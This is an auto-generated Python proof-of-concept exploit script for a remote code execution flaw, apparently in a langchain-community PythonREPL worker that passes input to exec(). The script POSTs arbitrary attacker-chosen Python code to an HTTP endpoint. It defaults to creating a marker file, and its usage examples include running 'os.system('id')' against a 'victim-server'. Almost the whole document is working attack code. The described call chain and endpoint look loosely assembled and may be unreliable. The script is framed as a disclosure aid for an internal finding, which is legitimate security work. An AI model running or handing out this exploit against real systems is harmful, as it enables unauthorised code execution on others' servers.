#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-013
# Sink: worker
# Auto-generated — run with: python3 rce_sink_function_worker_python_worker_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only RCE

Vulnerability: Remote Code Execution via unsanitized exec() call
CVE: N/A (internal finding)
Affected: langchain-community-only (/tmp/langchain-community-only)

The vulnerability exists in the PythonREPL utility's worker() function which
calls exec(command, globals, locals) without sanitization. The 'command'
parameter originates from user input through the following chain:
load_docs() -> lazy_load_docs() -> lazy_load() -> _get_message_data() ->
messages() -> reload_cache() -> clear() -> run() -> worker()

This PoC demonstrates the exploit by sending a benign payload that creates
a marker file to prove code execution.

Usage:
    python3 poc.py --target http://localhost:8000
    python3 poc.py --target http://victim-server:8080 --payload "print('pwned')"
"""

import argparse
import sys
import json
import time
import urllib.request
import urllib.error
import urllib.parse


def send_payload(target_url: str, payload: str, timeout: int = 10) -> str:
    """
    Send the malicious payload to the vulnerable endpoint.
    
    The payload is injected as the 'query' parameter which flows through
    the call chain to exec() in the PythonREPL worker.
    
    Args:
        target_url: Base URL of the vulnerable service
        payload: Python code to execute
        timeout: Request timeout in seconds
    
    Returns:
        Response text from the server
    """
    # The vulnerable endpoint is typically /api/v1/trigger
    endpoint = f"{target_url.rstrip('/')}/api/v1/trigger"
    
    # Prepare the request data - the 'query' parameter is the injection point
    data = urllib.parse.urlencode({'query': payload}).encode('utf-8')
    
    req = urllib.request.Request(
        endpoint,
        data=data,
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (PoC-Exploit)'
        },
        method='POST'
    )
    
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        # Even 500 errors might indicate successful code execution
        error_body = e.read().decode('utf-8') if e.fp else str(e)
        return f"HTTP Error {e.code}: {error_body}"
    except urllib.error.URLError as e:
        return f"Connection Error: {e.reason}"
    except Exception as e:
        return f"Unexpected Error: {str(e)}"


def verify_exploit_success(target_url: str, marker_path: str = "/tmp/poc_success.txt") -> bool:
    """
    Verify that the exploit was successful by checking if the marker file exists.
    
    This is a secondary check - the primary verification is the response
    from the server which should contain the output of our executed code.
    
    Args:
        target_url: Base URL of the vulnerable service
        marker_path: Path to the marker file created by the payload
    
    Returns:
        True if the marker file exists (exploit successful)
    """
    # Try to access a file listing or check endpoint if available
    # For this PoC, we'll just check if we can access the marker file
    # through a separate endpoint or by reading the response
    check_payload = f"__import__('os').path.exists('{marker_path}')"
    response = send_payload(target_url, check_payload)
    
    # The response should contain 'True' if the file exists
    return 'True' in response


def main():
    parser = argparse.ArgumentParser(
        description='PoC Exploit for langchain-community-only RCE',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target http://localhost:8000
  %(prog)s --target http://victim-server:8080 --payload "print('pwned')"
  %(prog)s --target http://target:5000 --payload "import os; os.system('id')"
        """
    )
    
    parser.add_argument(
        '--target',
        required=True,
        help='Target URL (e.g., http://localhost:8000)'
    )
    
    parser.add_argument(
        '--payload',
        default="__import__('os').system('touch /tmp/poc_success.txt')",
        help='Python code to execute (default: create marker file)'
    )
    
    parser.add_argument(
        '--timeout',
        type=int,
        default=10,
        help='Request timeout in seconds (default: 10)'
    )
    
    parser.add_argument(
        '--verify',
        action='store_true',
        help='Verify exploit success by checking marker file'
    )
    
    args = parser.parse_args()
    
    print("[*] Proof-of-Concept Exploit for langchain-community-only RCE")
    print(f"[*] Target: {args.target}")
    print(f"[*] Payload: {args.payload}")
    print(f"[*] Timeout: {args.timeout}s")
    print()
    
    # Step 1: Send the exploit payload
    print("[*] Sending exploit payload...")
    response = send_payload(args.target, args.payload, args.timeout)
    
    print(f"[*] Server response:")
    print(f"    {response[:500]}{'...' if len(response) > 500 else ''}")
    print()
    
    # Step 2: Verify exploit success
    if args.verify:
        print("[*] Verifying exploit success...")
        time.sleep(1)  # Give the server time to execute
        
        if verify_exploit_success(args.target):
            print("[+] EXPLOIT SUCCESSFUL - Code execution confirmed!")
            print(f"[+] Marker file /tmp/poc_success.txt was created")
        else:
            print("[-] Could not verify exploit success")
            print("[*] Check the server response for execution output")
    else:
        print("[*] Skipping verification (use --verify to check)")
        print("[*] Check if /tmp/poc_success.txt was created on the target")
    
    print()
    print("[*] Exploit completed")


if __name__ == "__main__":
    main()
